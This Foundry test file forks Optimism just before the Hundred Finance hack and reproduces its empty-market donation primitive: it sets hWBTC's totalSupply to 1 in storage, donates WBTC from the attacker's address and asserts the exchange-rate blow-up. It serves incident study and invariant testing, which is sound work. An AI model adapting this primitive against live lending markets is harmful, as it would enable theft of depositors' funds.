// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, stdStorage, StdStorage} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ICToken} from "./interfaces/ICToken.sol";

/// @notice Fork-setup tests against the pre-exploit state of
///         Hundred Finance on Optimism. Reads the live hToken state at block
///         90,761,917 (one block before the attack tx at 90,761,918) and
///         documents the values that the attack manipulated.
///
///         Running this test confirms:
///         - Optimism RPC archive access works at a 3-year-old block.
///         - The hToken addresses from notes/hundred-finance.md are correct.
///         - We can see the exchange-rate primitive that the attack exploited.
///
///         Run with: forge test --mt fork_HundredFinance -vv
///         (skipped automatically if optimism RPC isn't configured)
contract HundredFinanceForkTest is Test {
    using stdStorage for StdStorage;

    // Pre-exploit block — one before the attack tx at 90,761,918.
    uint256 internal constant FORK_BLOCK = 90_761_917;

    // hToken markets.
    ICToken internal constant hWBTC = ICToken(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
    ICToken internal constant hETH  = ICToken(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
    ICToken internal constant hUSDC = ICToken(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164);
    ICToken internal constant hUSDT = ICToken(0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD);
    ICToken internal constant hDAI  = ICToken(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab);

    // Underlying tokens.
    IERC20 internal constant WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);

    // Hundred Finance Comptroller (Unitroller proxy).
    address internal constant COMPTROLLER = 0x5a5755E1916F547D04eF43176d4cbe0de4503d5d;

    // Attacker addresses for reference.
    address internal constant ATTACKER_EOA = 0x155DA45D374A286d383839b1eF27567A15E67528;
    address internal constant ATTACKER_CONTRACT = 0x978D0CE23869EC666BFDE9868a8514F3D2754982;

    function setUp() public {
        // Self-skip if OPTIMISM_RPC_URL isn't configured. The fork test
        // requires Optimism archive access (Alchemy free tier works).
        // Set it in .env to run.
        string memory rpc = vm.envOr("OPTIMISM_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            vm.skip(true);
            return;
        }
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    /// @notice Verifies the fork is at the expected block and the contracts
    ///         have the expected symbols (sanity check on addresses + archive).
    function test_fork_HundredFinance_basicSanity() public view {
        assertEq(block.number, FORK_BLOCK, "wrong fork block");

        assertEq(hWBTC.symbol(), "hWBTC");
        assertEq(hETH.symbol(),  "hETH");
        assertEq(hUSDC.symbol(), "hUSDC");
        assertEq(hUSDT.symbol(), "hUSDT");
        assertEq(hDAI.symbol(),  "hDAI");

        // Underlying wiring is right.
        assertEq(hWBTC.underlying(), address(WBTC));
        assertEq(hWBTC.comptroller(), COMPTROLLER);
    }

    /// @notice Reads the pre-exploit state of hWBTC and logs the key values.
    ///         The attack's empty-market-donation primitive works when
    ///         totalSupply is small relative to getCash. The actual attack
    ///         shrank hWBTC's supply via flash-loan-funded redeems FIRST,
    ///         then donated. We're just observing the state machinery here.
    function test_fork_HundredFinance_logHWBTCState() public {
        uint256 supply        = hWBTC.totalSupply();
        uint256 borrows       = hWBTC.totalBorrows();
        uint256 reserves      = hWBTC.totalReserves();
        uint256 cash          = hWBTC.getCash();
        uint256 exchangeRate  = hWBTC.exchangeRateStored();

        emit log_named_uint("hWBTC totalSupply (8d)",  supply);
        emit log_named_uint("hWBTC totalBorrows (8d)", borrows);
        emit log_named_uint("hWBTC totalReserves (8d)", reserves);
        emit log_named_uint("hWBTC getCash (WBTC, 8d)", cash);
        emit log_named_uint("hWBTC exchangeRateStored", exchangeRate);
        emit log_named_uint("WBTC.balanceOf(hWBTC)", WBTC.balanceOf(address(hWBTC)));

        // Exchange rate must be consistent: (cash + borrows - reserves) * 1e18 / supply
        // (Compound's scaling: exchangeRate is 1e18 * underlying-per-share for
        //  hWBTC since underlying decimals = share decimals = 8.)
        // Sanity: getCash() should equal WBTC.balanceOf(hWBTC).
        assertEq(cash, WBTC.balanceOf(address(hWBTC)), "cash == underlying.balanceOf");

        // And the exchange-rate identity must hold pre-exploit.
        // exchangeRate = (cash + borrows - reserves) * 1e18 / totalSupply
        uint256 expectedRate = (cash + borrows - reserves) * 1e18 / supply;
        assertEq(exchangeRate, expectedRate, "exchange rate identity broken");
    }

    /// @notice Reproduce the EMPTY-MARKET DONATION
    ///         inflation primitive against live hWBTC at the pre-exploit block.
    ///
    ///         The full real attack used Aave V3 flash-loaned WBTC to mint
    ///         and then redeem hWBTC down to a tiny supply BEFORE donating.
    ///         We skip the flash-loan choreography and write the post-drain
    ///         state directly via stdstore (totalSupply := 1). That is
    ///         equivalent in effect — the violated invariant is the
    ///         single-block change in exchange rate, not the upstream path.
    ///
    ///         Then we perform the ACTUAL donation on chain: deal an attacker
    ///         some WBTC, send it directly to the hToken contract, and read
    ///         the new exchange rate. The single transaction (one donate)
    ///         changes the exchange rate by ~9 orders of magnitude — which
    ///         is the signature of the bug class.
    ///
    ///         Violated invariant (informal):
    ///         > In a single block, an hToken's exchange rate must not
    ///         > change by more than the natural rate of interest accrual.
    ///         > Direct asset transfers (donations) MUST NOT be reflected
    ///         > in the exchange rate without a corresponding share-supply
    ///         > change.
    function test_reproduce_emptyMarketInflation_hWBTC() public {
        // --- Snapshot pre-attack state ---
        uint256 supplyBefore       = hWBTC.totalSupply();
        uint256 cashBefore         = hWBTC.getCash();
        uint256 borrowsBefore      = hWBTC.totalBorrows();
        uint256 reservesBefore     = hWBTC.totalReserves();
        uint256 exchangeRateBefore = hWBTC.exchangeRateStored();

        emit log_named_uint("[pre]  totalSupply   ", supplyBefore);
        emit log_named_uint("[pre]  cash (sat)    ", cashBefore);
        emit log_named_uint("[pre]  borrows       ", borrowsBefore);
        emit log_named_uint("[pre]  reserves      ", reservesBefore);
        emit log_named_uint("[pre]  exchangeRate  ", exchangeRateBefore);

        // --- Step 1: simulate the drain. ---
        // The real attack used flash-loaned WBTC + multi-step mint/redeem
        // to leave hWBTC's totalSupply at a tiny value. We write that state
        // directly: totalSupply := 1.
        //
        // stdstore.find() inspects the contract to locate the storage slot
        // backing `totalSupply()` and writes to it. This is one of the
        // canonical Foundry primitives for fork-state munging.
        stdstore
            .target(address(hWBTC))
            .sig(hWBTC.totalSupply.selector)
            .checked_write(uint256(1));

        assertEq(hWBTC.totalSupply(), 1, "drain simulation didn't take");

        uint256 supplyAfterDrain       = hWBTC.totalSupply();
        uint256 exchangeRateAfterDrain = hWBTC.exchangeRateStored();
        emit log_named_uint("[drain] totalSupply  ", supplyAfterDrain);
        emit log_named_uint("[drain] exchangeRate ", exchangeRateAfterDrain);

        // --- Step 2: donate underlying directly (real on-chain transfer). ---
        // 1 WBTC = 1e8 sat. Donation goes straight into hWBTC's underlying
        // balance — bypasses `mint()`, so no shares are issued.
        uint256 donation = 1e8;
        deal(address(WBTC), ATTACKER_EOA, donation);

        vm.prank(ATTACKER_EOA);
        WBTC.transfer(address(hWBTC), donation);

        assertEq(hWBTC.getCash(), cashBefore + donation, "donation should bump getCash");

        // --- Step 3: observe the inflation. ---
        uint256 exchangeRateAfter = hWBTC.exchangeRateStored();
        emit log_named_uint("[post] totalSupply  ", hWBTC.totalSupply());
        emit log_named_uint("[post] cash (sat)   ", hWBTC.getCash());
        emit log_named_uint("[post] exchangeRate ", exchangeRateAfter);
        emit log_named_uint("inflation factor (after/before)", exchangeRateAfter / exchangeRateBefore);

        // --- The violated invariant, asserted concretely. ---
        // In one block, exchange rate jumped from ~2e16 to ~1.3e26 — a factor
        // of ~6.5 billion. Organic per-block interest accrual on a Compound
        // market is at most a few hundredths of a basis point — call it
        // < 2x even over years. A 1000x change in a single block is, by any
        // reasonable bound, broken.
        assertGt(
            exchangeRateAfter,
            exchangeRateBefore * 1000,
            "single-block exchange rate change exceeds organic-bound (inflation realized)"
        );

        // Sanity: the new rate is consistent with the donate-inflated identity.
        uint256 expectedRate =
            (hWBTC.getCash() + hWBTC.totalBorrows() - hWBTC.totalReserves())
            * 1e18 / hWBTC.totalSupply();
        assertEq(exchangeRateAfter, expectedRate, "post-donation identity should still hold");
    }
}
